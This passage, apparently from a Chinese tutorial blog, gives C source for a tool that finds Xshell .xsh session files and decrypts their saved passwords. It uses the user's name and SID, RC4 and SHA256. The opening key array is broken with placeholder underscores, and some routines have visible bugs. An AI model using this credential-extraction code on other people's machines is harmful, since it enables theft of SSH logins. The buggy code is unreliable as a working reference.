<h3 id="5-3-对于用户设置了主密码的情况"><a href="#5-3-对于用户设置了主密码的情况" class="headerlink" title="5.3 对于用户设置了主密码的情况"></a>5.3 对于用户设置了主密码的情况</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> unsigned char finalresult [ ] =</span><br><span class="line">     &#123; 0x46，0xb9，0xb7，0x3f，0x70，0x0b，0xd2,0x20，0xd5，0xee，0x70，0x5b，0x4b，0x66，0xc7，0xbe，0x1e， </span><br><span class="line">     0xD9,0x02，0xFB，0x8D，0xD4 _ _ _ _ _ _ _ _ _ _ _ _ _ _</span><br><span class="line">     _ _ _ _ _ , 0xD4 , 0x89 ,</span><br><span class="line">    0x97，0xC6,0x45,0x2f，0x5d，0x7e，0x50,0x9f，0xbc，0xdb，0xe2,0x80,0x8b，</span><br><span class="line">     0x16，0xbc，0xf4，0xed，0xce，0x4c，0x07，0xd1，0x4e &#125; </span><br><span class="line">; _ _ _ _ _ _ _ _ _</span><br><span class="line">     _ _ _ _ _ _ _ _ _ _</span><br></pre></td></tr></table></figure>





<h2 id="6-将最终结果转换为Base64格式"><a href="#6-将最终结果转换为Base64格式" class="headerlink" title="6.将最终结果转换为Base64格式"></a>6.将最终结果转换为Base64格式</h2><p>解密失败的原因： 先考虑版本问题，再考虑是否设置了userkey，再考虑是否使用其他方式登录验证，比如公钥，或者根本就没有保存。</p>
<h1 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h1><p>第一次造轮子，代码肯定很烂，如果有更好的实现可以交流</p>
<h2 id="获取用户名和SID"><a href="#获取用户名和SID" class="headerlink" title="获取用户名和SID"></a>获取用户名和SID</h2><p>这个微软有自带的api，可以读取当前用户的用户名和sid</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">Getsid</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">LPWSTR wSid = <span class="literal">NULL</span>;</span><br><span class="line">TCHAR UserName[<span class="number">64</span>], DomainName[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">Getsid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	<span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!]OpenProcessToken error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD Size, UserSize, DomainSize;</span><br><span class="line">	SID* sid;</span><br><span class="line">	SID_NAME_USE SidType;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	TOKEN_USER* User;</span><br><span class="line">	Size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	GetTokenInformation(hToken, TokenUser, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;Size);</span><br><span class="line">	<span class="keyword">if</span> (!Size)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	User = (TOKEN_USER*)<span class="built_in">malloc</span>(Size);</span><br><span class="line">	assert(User);</span><br><span class="line">	GetTokenInformation(hToken, TokenUser, User, Size, &amp;Size);</span><br><span class="line">	assert(Size);</span><br><span class="line">	Size = GetLengthSid(User-&gt;User.Sid);</span><br><span class="line">	assert(Size);</span><br><span class="line">	sid = (SID*)<span class="built_in">malloc</span>(Size);</span><br><span class="line">	assert(sid);</span><br><span class="line"></span><br><span class="line">	CopySid(Size, sid, User-&gt;User.Sid);</span><br><span class="line">	UserSize = (<span class="keyword">sizeof</span> UserName / <span class="keyword">sizeof</span> * UserName) - <span class="number">1</span>;</span><br><span class="line">	DomainSize = (<span class="keyword">sizeof</span> DomainName / <span class="keyword">sizeof</span> * DomainName) - <span class="number">1</span>;</span><br><span class="line">	LookupAccountSid(<span class="literal">NULL</span>, sid, UserName, &amp;UserSize, DomainName, &amp;DomainSize, &amp;SidType);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> ret = ConvertSidToStringSid(User-&gt;User.Sid, &amp;wSid);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(ret)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to return ret.&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Error code=0x&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%4x&quot;</span>, ret);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span>* result = <span class="built_in">strcat</span>(UserName, wSid);</span><br><span class="line">	<span class="built_in">free</span>(sid);</span><br><span class="line">	<span class="built_in">free</span>(User);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h2><p>递归查找目录和后缀</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span>* path, <span class="keyword">char</span>* name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> szFind[MAX_PATH], szFile[MAX_PATH];</span><br><span class="line">    WIN32_FIND_DATA fd;</span><br><span class="line">    <span class="built_in">sprintf</span>(szFind, <span class="string">&quot;%s\\%s&quot;</span>, path, name);</span><br><span class="line">    HANDLE hFind = FindFirstFile(szFind, &amp;fd);</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE != hFind)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span>* q = name;</span><br><span class="line">            <span class="keyword">char</span>* p = fd.cFileName;</span><br><span class="line">            <span class="keyword">while</span> (q) &#123;</span><br><span class="line">                <span class="keyword">if</span> (*q == <span class="string">&#x27;.&#x27;</span>)<span class="keyword">break</span>;   <span class="comment">//匹配扩展名</span></span><br><span class="line">                q++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (p) &#123;</span><br><span class="line">                <span class="keyword">if</span> (*p == <span class="string">&#x27;.&#x27;</span>)<span class="keyword">break</span>;</span><br><span class="line">                p++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strncmp</span>(p, q, <span class="built_in">strlen</span>(q) + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!FindNextFile(hFind, &amp;fd))<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> path_len = <span class="built_in">strlen</span>(path) + <span class="built_in">strlen</span>(fd.cFileName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">char</span>* tmp_pathname = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(file_Len);</span><br><span class="line">            <span class="built_in">sprintf</span>(tmp_pathname, <span class="string">&quot;%s\\%s&quot;</span>, path, fd.cFileName);</span><br><span class="line">            path_add(tmp_pathname);</span><br><span class="line"></span><br><span class="line">            num1++;</span><br><span class="line">            <span class="keyword">if</span> (!FindNextFile(hFind, &amp;fd))<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FindClose(hFind);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sprintf</span>(szFind, <span class="string">&quot;%s\\*.*&quot;</span>, path);</span><br><span class="line"></span><br><span class="line">    hFind = FindFirstFile(szFind, &amp;fd);</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFind)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (fd.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(szFile, <span class="string">&quot;%s\\%s&quot;</span>, path, fd.cFileName);</span><br><span class="line">                find(szFile, name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!FindNextFile(hFind, &amp;fd))<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FindClose(hFind);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="宽字符转换"><a href="#宽字符转换" class="headerlink" title="宽字符转换"></a>宽字符转换</h2><p>其中在读取txt文件的时候，可以直接读取里面的内容。</p>
<p>但我要读的是 xsh 后缀的文件，直接读取读出来是乱码。这里涉及到宽窄字符的问题，需要将宽字符转换为窄字符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">become_char</span><span class="params">(WCHAR* source, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* tmp = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size / <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">    WideCharToMultiByte(CP_ACP, <span class="number">0</span>, source, wcslen(source), tmp, size, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    tmp[<span class="built_in">strlen</span>(tmp)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">free</span>(source);</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="读取文件所有内容"><a href="#读取文件所有内容" class="headerlink" title="读取文件所有内容"></a>读取文件所有内容</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">getfileall</span><span class="params">(<span class="keyword">char</span>* fname, <span class="keyword">int</span> MODEL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* file = fopen(fname, <span class="string">&quot;rb+&quot;</span>);</span><br><span class="line">    <span class="keyword">fpos_t</span> pos = <span class="number">0</span>;</span><br><span class="line">    fgetpos(file, &amp;pos);</span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">int</span> filesize = ftell(file);</span><br><span class="line">    <span class="keyword">char</span>* buffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(filesize + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="built_in">strlen</span>(buffer));</span><br><span class="line">    buffer[filesize] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    fsetpos(file, &amp;pos);</span><br><span class="line">    fread(buffer, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), filesize, file);</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">if</span> (MODEL == WCHAR_MODEL)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> become_char(buffer, filesize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (MODEL == CHAR_MODEL)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="匹配字段"><a href="#匹配字段" class="headerlink" title="匹配字段"></a>匹配字段</h2><p>从待读取的字符串中匹配关键词</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">extract</span><span class="params">(<span class="keyword">char</span>* txt, <span class="keyword">char</span>* name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* ptr = <span class="literal">NULL</span>;</span><br><span class="line">    ptr = txt;</span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (total &gt; <span class="number">0</span>)</span><br><span class="line">            ptr += <span class="built_in">strlen</span>(name);</span><br><span class="line"></span><br><span class="line">        ptr = <span class="built_in">strstr</span>(ptr, name);</span><br><span class="line">        <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到该字段\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        total++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (*(ptr - <span class="number">1</span>) != <span class="number">0x0a</span>);</span><br><span class="line"></span><br><span class="line">    ptr = ptr + <span class="built_in">strlen</span>(name) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> len = get_len(ptr);</span><br><span class="line">    <span class="keyword">char</span>* <span class="keyword">final</span> = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="keyword">final</span>, <span class="number">0</span>, <span class="built_in">strlen</span>(<span class="keyword">final</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(<span class="keyword">final</span>, ptr, len);</span><br><span class="line">    <span class="keyword">final</span>[<span class="built_in">strlen</span>(<span class="keyword">final</span>) + <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">final</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BYTE* <span class="title">RC4</span><span class="params">(<span class="keyword">char</span>* pDate, <span class="keyword">int</span> pData_len, BYTE* rc4_key, <span class="keyword">int</span> rc4_key_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> array2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    BYTE* passwd = (BYTE*)<span class="built_in">malloc</span>(pData_len);</span><br><span class="line">    ZeroMemory(passwd, pData_len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">array</span>[i] = rc4_key[i % rc4_key_len];</span><br><span class="line">        array2[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num = i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num = (num + array2[i] + <span class="built_in">array</span>[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">int</span> num2 = array2[i];</span><br><span class="line">        array2[i] = array2[num];</span><br><span class="line">        array2[num] = num2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num3 = num = (i = <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; pData_len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num3++;</span><br><span class="line">        num3 %= <span class="number">256</span>;</span><br><span class="line">        num += array2[num3];</span><br><span class="line">        num %= <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">int</span> num2 = array2[num3];</span><br><span class="line">        array2[num3] = array2[num];</span><br><span class="line">        array2[num] = num2;</span><br><span class="line">        <span class="keyword">int</span> num4 = array2[(array2[num3] + array2[num]) % <span class="number">256</span>];</span><br><span class="line">        passwd[i] = (byte)(pDate[i] ^ num4);</span><br><span class="line">    &#125;</span><br><span class="line">    passwd[pData_len] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> passwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SHA256"><a href="#SHA256" class="headerlink" title="SHA256"></a>SHA256</h2><h4 id="sha256-c"><a href="#sha256-c" class="headerlink" title="sha256.c"></a>sha256.c</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAP_BYTES</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_STD_MEMCPY</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;sha256.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RL(x,n)   (((x) <span class="meta-string">&lt;&lt; n) | ((x) &gt;</span>&gt; (32 - n)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RR(x,n)   (((x) &gt;&gt; n) | ((x) &lt;&lt; (32 - n)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S0(x)  (RR((x), 2) ^ RR((x),13) ^ RR((x),22))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S1(x)  (RR((x), 6) ^ RR((x),11) ^ RR((x),25))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G0(x)  (RR((x), 7) ^ RR((x),18) ^ ((x) &gt;&gt; 3))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G1(x)  (RR((x),17) ^ RR((x),19) ^ ((x) &gt;&gt; 10))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSWP(x,y)  _bswapw((uint32_t *)(x), (uint32_t)(y))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMCP(x,y,z) _memcp((x),(y),(z))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> K[<span class="number">64</span>] = &#123;</span><br><span class="line">         <span class="number">0x428a2f98</span>, <span class="number">0x71374491</span>, <span class="number">0xb5c0fbcf</span>, <span class="number">0xe9b5dba5</span>,</span><br><span class="line">         <span class="number">0x3956c25b</span>, <span class="number">0x59f111f1</span>, <span class="number">0x923f82a4</span>, <span class="number">0xab1c5ed5</span>,</span><br><span class="line">         <span class="number">0xd807aa98</span>, <span class="number">0x12835b01</span>, <span class="number">0x243185be</span>, <span class="number">0x550c7dc3</span>,</span><br><span class="line">         <span class="number">0x72be5d74</span>, <span class="number">0x80deb1fe</span>, <span class="number">0x9bdc06a7</span>, <span class="number">0xc19bf174</span>,</span><br><span class="line">         <span class="number">0xe49b69c1</span>, <span class="number">0xefbe4786</span>, <span class="number">0x0fc19dc6</span>, <span class="number">0x240ca1cc</span>,</span><br><span class="line">         <span class="number">0x2de92c6f</span>, <span class="number">0x4a7484aa</span>, <span class="number">0x5cb0a9dc</span>, <span class="number">0x76f988da</span>,</span><br><span class="line">         <span class="number">0x983e5152</span>, <span class="number">0xa831c66d</span>, <span class="number">0xb00327c8</span>, <span class="number">0xbf597fc7</span>,</span><br><span class="line">         <span class="number">0xc6e00bf3</span>, <span class="number">0xd5a79147</span>, <span class="number">0x06ca6351</span>, <span class="number">0x14292967</span>,</span><br><span class="line">         <span class="number">0x27b70a85</span>, <span class="number">0x2e1b2138</span>, <span class="number">0x4d2c6dfc</span>, <span class="number">0x53380d13</span>,</span><br><span class="line">         <span class="number">0x650a7354</span>, <span class="number">0x766a0abb</span>, <span class="number">0x81c2c92e</span>, <span class="number">0x92722c85</span>,</span><br><span class="line">         <span class="number">0xa2bfe8a1</span>, <span class="number">0xa81a664b</span>, <span class="number">0xc24b8b70</span>, <span class="number">0xc76c51a3</span>,</span><br><span class="line">         <span class="number">0xd192e819</span>, <span class="number">0xd6990624</span>, <span class="number">0xf40e3585</span>, <span class="number">0x106aa070</span>,</span><br><span class="line">         <span class="number">0x19a4c116</span>, <span class="number">0x1e376c08</span>, <span class="number">0x2748774c</span>, <span class="number">0x34b0bcb5</span>,</span><br><span class="line">         <span class="number">0x391c0cb3</span>, <span class="number">0x4ed8aa4a</span>, <span class="number">0x5b9cca4f</span>, <span class="number">0x682e6ff3</span>,</span><br><span class="line">         <span class="number">0x748f82ee</span>, <span class="number">0x78a5636f</span>, <span class="number">0x84c87814</span>, <span class="number">0x8cc70208</span>,</span><br><span class="line">         <span class="number">0x90befffa</span>, <span class="number">0xa4506ceb</span>, <span class="number">0xbef9a3f7</span>, <span class="number">0xc67178f2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _bswapw(<span class="keyword">uint32_t</span>* p, <span class="keyword">uint32_t</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (i--) p[i] = (RR(p[i], <span class="number">24</span>) &amp; <span class="number">0x00ff00ff</span>) | (RR(p[i], <span class="number">8</span>) &amp; <span class="number">0xff00ff00</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">/* _bswapw */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* __cdecl _memcp(<span class="keyword">void</span>* d, <span class="keyword">const</span> <span class="keyword">void</span>* s, <span class="keyword">uint32_t</span> sz)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span>* rv = d;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (sz--) *(<span class="keyword">char</span>*)d = *(<span class="keyword">char</span>*)s, d = (<span class="keyword">char</span>*)d + <span class="number">1</span>, s = (<span class="keyword">char</span>*)s + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(rv);</span><br><span class="line">&#125; <span class="comment">/* _memcp */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _rtrf(<span class="keyword">uint32_t</span>* b, <span class="keyword">uint32_t</span>* p, <span class="keyword">uint32_t</span> i, <span class="keyword">uint32_t</span> j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> B(x, y) b[(x-y) &amp; 7]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> P(x, y) p[(x+y) &amp; 15]</span></span><br><span class="line"></span><br><span class="line">    B(<span class="number">7</span>, i) += (j ? (p[i &amp; <span class="number">15</span>] += G1(P(i, <span class="number">14</span>)) + P(i, <span class="number">9</span>) + G0(P(i, <span class="number">1</span>))) : p[i &amp; <span class="number">15</span>])</span><br><span class="line">        + K[i + j] + S1(B(<span class="number">4</span>, i))</span><br><span class="line">        + (B(<span class="number">6</span>, i) ^ (B(<span class="number">4</span>, i) &amp; (B(<span class="number">5</span>, i) ^ B(<span class="number">6</span>, i))));</span><br><span class="line">    B(<span class="number">3</span>, i) += B(<span class="number">7</span>, i);</span><br><span class="line">    B(<span class="number">7</span>, i) += S0(B(<span class="number">0</span>, i)) + ((B(<span class="number">0</span>, i) &amp; B(<span class="number">1</span>, i)) | (B(<span class="number">2</span>, i) &amp; (B(<span class="number">0</span>, i) ^ B(<span class="number">1</span>, i))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> P</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> B</span></span><br><span class="line">&#125; <span class="comment">/* _rtrf */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _hash(sha256_context* ctx)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> b[<span class="number">8</span>], * p, j;</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0</span>] = ctx-&gt;hash[<span class="number">0</span>]; b[<span class="number">1</span>] = ctx-&gt;hash[<span class="number">1</span>]; b[<span class="number">2</span>] = ctx-&gt;hash[<span class="number">2</span>];</span><br><span class="line">    b[<span class="number">3</span>] = ctx-&gt;hash[<span class="number">3</span>]; b[<span class="number">4</span>] = ctx-&gt;hash[<span class="number">4</span>]; b[<span class="number">5</span>] = ctx-&gt;hash[<span class="number">5</span>];</span><br><span class="line">    b[<span class="number">6</span>] = ctx-&gt;hash[<span class="number">6</span>]; b[<span class="number">7</span>] = ctx-&gt;hash[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (p = ctx-&gt;buf, j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j += <span class="number">16</span>)</span><br><span class="line">        _rtrf(b, p, <span class="number">0</span>, j), _rtrf(b, p, <span class="number">1</span>, j), _rtrf(b, p, <span class="number">2</span>, j),</span><br><span class="line">        _rtrf(b, p, <span class="number">3</span>, j), _rtrf(b, p, <span class="number">4</span>, j), _rtrf(b, p, <span class="number">5</span>, j),</span><br><span class="line">        _rtrf(b, p, <span class="number">6</span>, j), _rtrf(b, p, <span class="number">7</span>, j), _rtrf(b, p, <span class="number">8</span>, j),</span><br><span class="line">        _rtrf(b, p, <span class="number">9</span>, j), _rtrf(b, p, <span class="number">10</span>, j), _rtrf(b, p, <span class="number">11</span>, j),</span><br><span class="line">        _rtrf(b, p, <span class="number">12</span>, j), _rtrf(b, p, <span class="number">13</span>, j), _rtrf(b, p, <span class="number">14</span>, j),</span><br><span class="line">        _rtrf(b, p, <span class="number">15</span>, j);</span><br><span class="line"></span><br><span class="line">    ctx-&gt;hash[<span class="number">0</span>] += b[<span class="number">0</span>]; ctx-&gt;hash[<span class="number">1</span>] += b[<span class="number">1</span>]; ctx-&gt;hash[<span class="number">2</span>] += b[<span class="number">2</span>];</span><br><span class="line">    ctx-&gt;hash[<span class="number">3</span>] += b[<span class="number">3</span>]; ctx-&gt;hash[<span class="number">4</span>] += b[<span class="number">4</span>]; ctx-&gt;hash[<span class="number">5</span>] += b[<span class="number">5</span>];</span><br><span class="line">    ctx-&gt;hash[<span class="number">6</span>] += b[<span class="number">6</span>]; ctx-&gt;hash[<span class="number">7</span>] += b[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">/* _hash */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sha256_init</span><span class="params">(sha256_context* ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ctx-&gt;len[<span class="number">0</span>] = ctx-&gt;len[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;hash[<span class="number">0</span>] = <span class="number">0x6a09e667</span>; ctx-&gt;hash[<span class="number">1</span>] = <span class="number">0xbb67ae85</span>;</span><br><span class="line">    ctx-&gt;hash[<span class="number">2</span>] = <span class="number">0x3c6ef372</span>; ctx-&gt;hash[<span class="number">3</span>] = <span class="number">0xa54ff53a</span>;</span><br><span class="line">    ctx-&gt;hash[<span class="number">4</span>] = <span class="number">0x510e527f</span>; ctx-&gt;hash[<span class="number">5</span>] = <span class="number">0x9b05688c</span>;</span><br><span class="line">    ctx-&gt;hash[<span class="number">6</span>] = <span class="number">0x1f83d9ab</span>; ctx-&gt;hash[<span class="number">7</span>] = <span class="number">0x5be0cd19</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">/* sha256_init */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sha256_hash</span><span class="params">(sha256_context* ctx, <span class="keyword">uint8_t</span>* dat, <span class="keyword">uint32_t</span> sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">uint32_t</span> i = ctx-&gt;len[<span class="number">0</span>] &amp; <span class="number">63</span>, l, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ctx-&gt;len[<span class="number">0</span>] += sz) &lt; sz)  ++(ctx-&gt;len[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>, l = <span class="number">64</span> - i; sz &gt;= l; j += l, sz -= l, l = <span class="number">64</span>, i = <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MEMCP((<span class="keyword">char</span>*)ctx-&gt;buf + i, &amp;dat[j], l);</span><br><span class="line">        BSWP(ctx-&gt;buf, <span class="number">16</span>);</span><br><span class="line">        _hash(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">    MEMCP((<span class="keyword">char</span>*)ctx-&gt;buf + i, &amp;dat[j], sz);</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">/* _hash */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sha256_done</span><span class="params">(sha256_context* ctx, <span class="keyword">uint8_t</span>* buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i = (<span 